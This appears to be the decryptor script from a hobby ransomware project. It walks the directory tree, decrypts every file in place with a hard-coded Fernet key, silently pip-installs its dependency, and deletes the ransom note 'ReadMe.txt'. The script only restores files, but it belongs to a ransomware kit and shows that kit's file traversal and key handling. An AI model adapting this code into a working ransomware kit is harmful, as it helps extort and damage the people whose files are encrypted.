from genericpath import isfile
import os
import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography')
from cryptography.fernet import Fernet 

# Encryption key that can be genrated randomly by fernet libary by python
key='7SpexdsyHOkKtPe9q7JCe384UV6E2MMjcxFgeyJZUzQ='   

def decryt(file):
    with open(file,"rb") as thefile:
        content= thefile.read()
        encrepted_Content = Fernet(key).decrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(encrepted_Content)

def delete_Warning_file():
     if os.path.exists("ReadMe.txt"):
        os.remove("ReadMe.txt")


def Recursion():
    files = []
    folder = []
    for file in os.listdir():
        if file == "ransome.py" or file == "AntiVirus.py":
            continue
        if os.path.isfile(file):
            decryt(file)
            delete_Warning_file()
        else:
            currentPath = os.getcwd()
            NewPath = currentPath + "\\"+file
            folder.append(NewPath)
            
    while(folder):
        currentPath_new = os.getcwd()
        os.chdir(folder.pop(0))
        Recursion()
        os.chdir(currentPath_new)


Recursion()










        


